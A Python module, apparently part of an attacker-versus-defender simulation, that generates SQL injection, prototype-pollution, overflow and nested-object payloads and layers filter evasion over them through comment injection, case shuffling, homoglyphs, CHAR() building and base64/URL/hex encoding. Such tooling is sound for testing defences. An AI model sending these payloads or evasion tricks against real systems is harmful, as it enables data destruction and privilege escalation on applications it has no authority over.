"""
ADAPTIVE ATTACK GENERATOR
==========================

Generates attacks with tunable parameters that adapt based on intelligence.

Features:
---------
1. PARAMETERIZED PAYLOADS: Size, encoding, nesting, obfuscation are tunable
2. INTELLIGENT GENERATION: Uses AttackerIntelligence to guide parameters
3. MUTATION ENGINE: Evolves successful attacks
4. EVASION TECHNIQUES: Applies multiple evasion layers
5. CONTEXT-AWARE: Adapts to defender's current state
"""

from typing import Any, Dict, List, Tuple
import base64
import random
from attacker_intelligence import (
    AttackerIntelligence, AttackVector, PayloadCharacteristics
)


# ============================================================================
# ADAPTIVE ATTACK GENERATOR
# ============================================================================

class AdaptiveAttackGenerator:
    """Generates adaptive attacks based on intelligence"""
    
    def __init__(self, intelligence: AttackerIntelligence):
        self.intelligence = intelligence
        self.mutation_history: List[str] = []
    
    def generate_injection_attack(self, optimized: bool = True) -> Tuple[Any, PayloadCharacteristics]:
        """Generate SQL injection with adaptive parameters"""
        
        if optimized:
            params = self.intelligence.get_optimal_parameters(AttackVector.INJECTION)
        else:
            params = {"size": 50, "encoding_layers": 0, "complexity": 1, "obfuscation_level": 3}
        
        # Base injection
        base_payloads = [
            "'; DROP TABLE users--",
            "admin' OR '1'='1",
            "1' UNION SELECT * FROM",
            "'; DELETE FROM admin--",
        ]
        
        payload = random.choice(base_payloads)
        
        # Apply obfuscation
        payload = self._apply_obfuscation(payload, params["obfuscation_level"])
        
        # Apply encoding layers
        payload = self._apply_encoding(payload, params["encoding_layers"])
        
        # Adjust size
        if len(payload) < params["size"]:
            padding = "/*" + "A" * (params["size"] - len(payload) - 4) + "*/"
            payload = payload + padding
        
        chars = PayloadCharacteristics(
            vector=AttackVector.INJECTION,
            size=len(str(payload)),
            encoding_layers=params["encoding_layers"],
            complexity=1,
            obfuscation_level=params["obfuscation_level"],
            uses_quotes="'" in str(payload) or '"' in str(payload),
            uses_special_chars=True,
            is_polymorphic=False
        )
        
        return payload, chars
    
    def generate_overflow_attack(self, optimized: bool = True) -> Tuple[Any, PayloadCharacteristics]:
        """Generate buffer overflow with adaptive size"""
        
        if optimized:
            params = self.intelligence.get_optimal_parameters(AttackVector.OVERFLOW)
        else:
            params = {"size": 1000, "encoding_layers": 0, "complexity": 1, "obfuscation_level": 3}
        
        # Generate overflow payload
        patterns = ["A", "B", "X", "\x00", "\xff"]
        pattern = random.choice(patterns)
        payload = pattern * params["size"]
        
        # Add malicious trailer
        payload += "'; DROP--"
        
        chars = PayloadCharacteristics(
            vector=AttackVector.OVERFLOW,
            size=len(payload),
            encoding_layers=0,
            complexity=1,
            obfuscation_level=0,
            uses_quotes=True,
            uses_special_chars=True,
            is_polymorphic=False
        )
        
        return payload, chars
    
    def generate_type_confusion_attack(self, optimized: bool = True) -> Tuple[Any, PayloadCharacteristics]:
        """Generate type confusion with adaptive complexity"""
        
        if optimized:
            params = self.intelligence.get_optimal_parameters(AttackVector.TYPE_CONFUSION)
        else:
            params = {"size": 100, "encoding_layers": 0, "complexity": 2, "obfuscation_level": 3}
        
        # Build nested structure based on complexity
        payload = {"malicious": "payload"}
        
        for i in range(params["complexity"]):
            payload = {"nested_" + str(i): payload}
        
        # Add injection in deep layer
        self._inject_deep(payload, "'; DROP TABLE--", params["complexity"])
        
        chars = PayloadCharacteristics(
            vector=AttackVector.TYPE_CONFUSION,
            size=len(str(payload)),
            encoding_layers=0,
            complexity=params["complexity"],
            obfuscation_level=params["obfuscation_level"],
            uses_quotes=True,
            uses_special_chars=False,
            is_polymorphic=False
        )
        
        return payload, chars
    
    def generate_encoding_attack(self, optimized: bool = True) -> Tuple[Any, PayloadCharacteristics]:
        """Generate multi-layer encoded attack"""
        
        if optimized:
            params = self.intelligence.get_optimal_parameters(AttackVector.ENCODING)
        else:
            params = {"size": 100, "encoding_layers": 2, "complexity": 1, "obfuscation_level": 5}
        
        payload = "'; DROP TABLE users--"
        
        # Apply encoding layers
        payload = self._apply_encoding(payload, params["encoding_layers"])
        
        chars = PayloadCharacteristics(
            vector=AttackVector.ENCODING,
            size=len(payload),
            encoding_layers=params["encoding_layers"],
            complexity=1,
            obfuscation_level=params["obfuscation_level"],
            uses_quotes=False,  # Encoded
            uses_special_chars=False,  # Encoded
            is_polymorphic=False
        )
        
        return payload, chars
    
    def generate_state_corruption_attack(self, optimized: bool = True) -> Tuple[Any, PayloadCharacteristics]:
        """Generate state corruption attack"""
        
        if optimized:
            params = self.intelligence.get_optimal_parameters(AttackVector.STATE_CORRUPTION)
        else:
            params = {"size": 200, "encoding_layers": 0, "complexity": 3, "obfuscation_level": 4}
        
        payload = {
            "_protected": "corrupted",
            "__proto__": {"isAdmin": True},
            "state": {"internal": "compromised"}
        }
        
        # Add complexity
        for i in range(params["complexity"]):
            payload[f"nested_{i}"] = {"level": i, "data": payload.copy()}
        
        chars = PayloadCharacteristics(
            vector=AttackVector.STATE_CORRUPTION,
            size=len(str(payload)),
            encoding_layers=0,
            complexity=params["complexity"],
            obfuscation_level=params["obfuscation_level"],
            uses_quotes=False,
            uses_special_chars=True,
            is_polymorphic=False
        )
        
        return payload, chars
    
    def generate_polymorphic_attack(self, base_payload: str) -> Tuple[Any, PayloadCharacteristics]:
        """Generate polymorphic variant"""
        
        # Mutation strategies
        mutations = [
            lambda p: p.replace("'", '"'),  # Quote swap
            lambda p: p.replace(" ", "/**/"),  # Comment injection
            lambda p: p.upper() if random.random() > 0.5 else p.lower(),  # Case change
            lambda p: p.replace("OR", "||"),  # Operator substitution
            lambda p: p.replace("=", " LIKE "),  # Operator variation
            lambda p: self._unicode_transform(p),  # Unicode tricks
        ]
        
        # Apply random mutations
        payload = base_payload
        for _ in range(random.randint(1, 3)):
            mutation = random.choice(mutations)
            payload = mutation(payload)
        
        self.mutation_history.append(payload)
        
        chars = PayloadCharacteristics(
            vector=AttackVector.INJECTION,
            size=len(payload),
            encoding_layers=0,
            complexity=1,
            obfuscation_level=7,
            uses_quotes="'" in payload or '"' in payload,
            uses_special_chars=True,
            is_polymorphic=True
        )
        
        return payload, chars
    
    def generate_adaptive_campaign(self, count: int = 10) -> List[Tuple[str, Any, PayloadCharacteristics]]:
        """Generate adaptive attack campaign"""
        
        campaign = []
        
        # Analyze defender's weakness
        weakest = self.intelligence.identify_weakest_defense()
        
        # Generate attacks targeting weakness
        generators = [
            ("injection", self.generate_injection_attack),
            ("overflow", self.generate_overflow_attack),
            ("type_confusion", self.generate_type_confusion_attack),
            ("encoding", self.generate_encoding_attack),
            ("state_corruption", self.generate_state_corruption_attack),
        ]
        
        for i in range(count):
            # Bias towards weak defense
            if weakest and "sanit" in weakest.lower() and random.random() > 0.3:
                attack_type, generator = ("injection", self.generate_injection_attack)
            elif weakest and "type" in weakest.lower() and random.random() > 0.3:
                attack_type, generator = ("type_confusion", self.generate_type_confusion_attack)
            elif weakest and "bounds" in weakest.lower() and random.random() > 0.3:
                attack_type, generator = ("overflow", self.generate_overflow_attack)
            else:
                attack_type, generator = random.choice(generators)
            
            payload, chars = generator(optimized=True)
            campaign.append((attack_type, payload, chars))
        
        return campaign
    
    def _apply_obfuscation(self, payload: str, level: int) -> str:
        """Apply obfuscation based on level"""
        
        if level >= 3:
            # Comment injection
            payload = payload.replace(" ", "/**/")
        
        if level >= 5:
            # Case randomization
            payload = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
        
        if level >= 7:
            # Unicode substitution
            payload = self._unicode_transform(payload)
        
        if level >= 9:
            # Character building
            payload = self._char_build(payload)
        
        return payload
    
    def _apply_encoding(self, payload: str, layers: int) -> str:
        """Apply encoding layers"""
        
        encoded = payload
        
        for layer in range(layers):
            if layer % 3 == 0:
                # Base64
                encoded = base64.b64encode(encoded.encode()).decode()
            elif layer % 3 == 1:
                # URL encoding
                encoded = self._url_encode(encoded)
            else:
                # Hex encoding
                encoded = self._hex_encode(encoded)
        
        return encoded
    
    def _inject_deep(self, obj: Dict, value: str, depth: int):
        """Inject value at specific depth"""
        if depth <= 0:
            obj["injected"] = value
            return
        
        for key, val in obj.items():
            if isinstance(val, dict):
                self._inject_deep(val, value, depth - 1)
                break
    
    def _unicode_transform(self, text: str) -> str:
        """Transform using unicode tricks"""
        transforms = {
            "O": "Ο",  # Greek Omicron
            "A": "Α",  # Greek Alpha
            "E": "Ε",  # Greek Epsilon
            "o": "ο",  # Greek lowercase omicron
            "a": "α",  # Greek lowercase alpha
        }
        
        for old, new in transforms.items():
            if random.random() > 0.5:
                text = text.replace(old, new)
        
        return text
    
    def _char_build(self, text: str) -> str:
        """Build string using character codes"""
        # Simulated - in real SQL: CHAR(65)+CHAR(66)...
        return f"CHAR({','.join(str(ord(c)) for c in text[:10])})"
    
    def _url_encode(self, text: str) -> str:
        """URL encode"""
        return ''.join(f'%{ord(c):02X}' if c in "';\"-" else c for c in text)
    
    def _hex_encode(self, text: str) -> str:
        """Hex encode"""
        return ''.join(f'\\x{ord(c):02x}' for c in text)